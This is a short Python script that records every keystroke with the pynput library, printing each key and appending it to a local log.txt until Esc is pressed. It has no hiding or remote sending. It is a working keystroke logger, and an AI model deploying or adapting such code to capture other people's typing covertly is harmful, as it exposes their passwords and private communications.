from pynput import keyboard

def on_press(key):
    print('{0} pressed'.format(key))
    write_file(key)

def write_file(key):
    key = str(key)
    f = open("log.txt", "a")
    print(f.write(key))


def on_release(key):
  if key == keyboard.Key.esc:
      return False


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()